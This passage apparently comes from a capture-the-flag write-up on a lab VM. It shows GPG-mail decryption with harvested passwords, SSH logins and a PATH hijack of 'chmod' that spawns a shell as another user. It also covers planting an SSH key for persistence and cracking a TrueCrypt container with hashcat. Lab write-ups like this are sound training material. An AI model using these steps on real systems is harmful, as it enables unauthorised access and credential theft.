</span><span class='line'>gpg: keyring <span class="sb">`</span>/home/jack/.gnupg/secring.gpg<span class="err">&#39;</span> created
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
</span><span class='line'>gpg: key 3F18AB0A: public key <span class="s2">&quot;jack@cowlovers.com&quot;</span> imported
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:               imported: 1  <span class="o">(</span>RSA: 1<span class="o">)</span>
</span><span class='line'>gpg:       secret keys <span class="nb">read</span>: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span></code></pre></td></tr></table></div></figure>


<p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>

<figure class='code'><figcaption><span>Decryting Jacks mail</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gpg /var/mail/jack/received/message.eml
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key <span class="k">for</span>
</span><span class='line'>user: <span class="s2">&quot;jack@cowlovers.com&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># used the password g0tmi1k69 found in the MySQL database</span>
</span><span class='line'>
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>
</span><span class='line'>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      <span class="s2">&quot;jack@cowlovers.com&quot;</span>
</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
</span><span class='line'>Enter new filename <span class="o">[</span>text.txt<span class="o">]</span>:
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>cat text.txt
</span><span class='line'>Ok Jack. I<span class="s1">&#39;ve created the account &#39;</span>milk_4_life<span class="s1">&#39; as per your request. Please stop emailing me about this now or I&#39;</span>m going to talk to HR like we discussed.
</span><span class='line'>
</span><span class='line'>The password is <span class="s1">&#39;4J0WWvL5nS&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>

<figure class='code'><figcaption><span>SSH as milk_4_life</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh milk_4_life@192.168.56.102
</span><span class='line'>milk_4_life@192.168.56.102<span class="err">&#39;</span>s password:
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Easy :D</p>

<h2>becoming george</h2>

<p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>

<figure class='code'><figcaption><span>milk_4_life game</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -lah game
</span><span class='line'>---s--x--x 1 george george 5.7K Jun 19 18:24 game
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span></code></pre></td></tr></table></div></figure>


<p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&amp;</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &amp;</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>

<figure class='code'><figcaption><span>Game TCP port</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game <span class="p">&amp;</span>
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;/usr/bin/game.py&quot;</span>, line 58, in &lt;module&gt;
</span><span class='line'>    tcpSocket.bind<span class="o">((</span><span class="s2">&quot;0.0.0.0&quot;</span>, 1337<span class="o">))</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/socket.py&quot;</span>, line 224, in meth
</span><span class='line'>    <span class="k">return </span>getattr<span class="o">(</span>self._sock,name<span class="o">)(</span>*args<span class="o">)</span>
</span><span class='line'>socket.error: <span class="o">[</span>Errno 98<span class="o">]</span> Address already in use
</span><span class='line'>Lol nope
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>tcp/1337 it is. Lets telnet to this:</p>

<figure class='code'><figcaption><span>Game Interface</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
</span><span class='line'>
</span><span class='line'>START
</span><span class='line'>Starting...
</span><span class='line'>
</span><span class='line'>You have 30 seconds to get as many points as you can, beat the high score! <span class="o">(</span>High Score: 133723<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Quick what<span class="s1">&#39;s... 397 x 358? 1</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... 498 x 111? 2
</span><span class='line'>Quick what<span class="err">&#39;</span>s... 740 x 772?
</span><span class='line'>Final Score: 0
</span><span class='line'>
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>milk_4_life@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>

<figure class='code'><figcaption><span>play_game.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start a socket</span>
</span><span class='line'><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span><span class='line'><span class="c"># connect locally</span>
</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>   <span class="c"># read 1024 bytes</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[I] </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ret</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'><span class="c"># start the game</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[O] START&#39;</span>
</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># START the game</span>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>   <span class="c"># read 1024 bytes</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[I] </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ret</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Start reading the socket input and calculating answers sending them back</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>   <span class="n">ret</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>   <span class="k">print</span> <span class="s">&#39;[I] </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ret</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>   <span class="c"># split by spaces</span>
</span><span class='line'>   <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>   <span class="c"># a question line</span>
</span><span class='line'>   <span class="k">if</span> <span class="n">ret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;Quick&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># extract the 2 integers from:</span>
</span><span class='line'>      <span class="c"># [&#39;Quick&#39;, &quot;what&#39;s...&quot;, &#39;435&#39;, &#39;x&#39;, &#39;574?&#39;, &#39;&#39;]</span>
</span><span class='line'>      <span class="n">one</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ret</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span><span class='line'>      <span class="n">two</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ret</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;?&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">))</span>   <span class="c"># remove the comma</span>
</span><span class='line'>      <span class="n">answer</span> <span class="o">=</span> <span class="n">one</span> <span class="o">*</span> <span class="n">two</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39;[O] Answer </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">answer</span>
</span><span class='line'>      <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>   <span class="c"># once the 30 seconds passes, a line with Final will return. This</span>
</span><span class='line'>   <span class="c"># is the end of the game</span>
</span><span class='line'>   <span class="k">elif</span> <span class="n">ret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;Final&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39;Done?&#39;</span>
</span><span class='line'>      <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>      <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>   <span class="c"># if we dont know what to do, just &#39;press enter&#39;</span>
</span><span class='line'>   <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>

<figure class='code'><figcaption><span>Game Win Output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>!*!*!*!*! Congratulations, new high score <span class="o">(</span>302785<span class="o">)</span> !*!*!*!*!
</span><span class='line'>
</span><span class='line'>I hear the faint sound of chmodding.......
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>

<p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>

<figure class='code'><figcaption><span>Testing chmod path resolve</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>python chmod.py          <span class="c"># test the script</span>
</span><span class='line'>Testing chmod <span class="nb">exec</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>cp chmod.py /tmp/chmod   <span class="c"># copy it to /tmp</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>chmod +x /tmp/chmod      <span class="c"># make it executable</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>/tmp/chmod               <span class="c"># test it</span>
</span><span class='line'>Testing chmod <span class="nb">exec</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>   <span class="c"># prefix PATH with /tmp</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>chmod                    <span class="c"># test it without full path</span>
</span><span class='line'>Testing chmod <span class="nb">exec</span>
</span><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>./game                   <span class="c"># start the game</span>
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span><span class='line'>Testing chmod <span class="nb">exec</span>                           <span class="c"># profit :)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>

<figure class='code'><figcaption><span>Evil chmod</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">pty</span>
</span><span class='line'><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>

<figure class='code'><figcaption><span>George&#8217;s permissions</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>milk_4_life@hell:~<span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span>,1002<span class="o">(</span>milk_4_life<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>

<figure class='code'><figcaption><span>Adding ssh key to George&#8217;s authorized_keys</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span>,1002<span class="o">(</span>milk_4_life<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /home/george
</span><span class='line'><span class="nv">$ </span>mkdir .ssh
</span><span class='line'><span class="nv">$ </span>/bin/chmod 755 .ssh
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> .ssh
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&quot;</span> &gt; authorized_keys
</span><span class='line'><span class="nv">$ </span>/bin/chmod 600 authorized_keys
</span></code></pre></td></tr></table></div></figure>


<p>Now we can SSH into the VM as <code>george</code></p>

<figure class='code'><figcaption><span>SSH Access as george</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh george@192.168.56.102 -i id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sat Jul  5 19:26:25 2014
</span><span class='line'>george@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>becoming bazza</h2>

<p>George&rsquo;s home directory had what looked like a TrueCrypt container <code>4.0M Jun 19 21:09 container.tc</code> in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.</p>

<p><code>george</code> also had mail in <code>/var/mail</code>:</p>

<figure class='code'><figcaption><span>George&#8217;s Signup Mail</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>cat /var/mail/george/signup.eml
</span><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for </span>signing up <span class="k">for </span>your account. I hope you enjoy our services.
</span><span class='line'>george@hell:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>

<h3>fast forward a few hours</h3>

<p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href="http://hashcat.net/oclhashcat/">oclHashcat</a>.</p>

<figure class='code'><figcaption><span>Windows ocl hashcat</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe
</span><span class='line'>-m 6211 C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>esktop<span class="se">\H</span>ell<span class="se">\c</span>ontainer.tc C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>esktop<span class="se">\H</span>ell<span class="se">\r</span>ockyou.txt
</span><span class='line'>
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>esktop<span class="se">\H</span>ell<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
</span><span class='line'>
</span><span class='line'>Session.Name...: oclHashcat
</span><span class='line'>Status.........: Cracked
</span><span class='line'>Input.Mode.....: File <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>esktop<span class="se">\H</span>ell<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span><span class='line'>Hash.Target....: File <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\S</span>omedude<span class="se">\D</span>esktop<span class="se">\H</span>ell<span class="se">\c</span>ontainer.tc<span class="o">)</span>
</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
</span><span class='line'>Time.Started...: Sun Jul 20 14:26:08 2014 <span class="o">(</span>19 secs<span class="o">)</span>
</span><span class='line'>Speed.GPU.#1...:    14578 H/s
</span><span class='line'>Speed.GPU.#2...:    16165 H/s
</span><span class='line'>Speed.GPU.#*...:    30743 H/s
</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
</span><span class='line'>Progress.......: 563201/14343297 <span class="o">(</span>3.93%<span class="o">)</span>
</span><span class='line'>Skipped........: 0/563201 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>Rejected.......: 1/563201 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan
</span><span class='line'>HWMon.GPU.#2...:  0% Util, 90c Temp, 100% Fan
</span><span class='line'>
</span><span class='line'>Started: Sun Jul 20 14:26:08 2014
</span><span class='line'>Stopped: Sun Jul 20 14:26:42 2014
</span></code></pre></td></tr></table></div></figure>


<p>About 19 seconds later, we have the password thanks to hashcat!</p>

<p>So, lets mount the container and see whats inside:</p>

<figure class='code'><figcaption><span>george TrueCrypt container</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
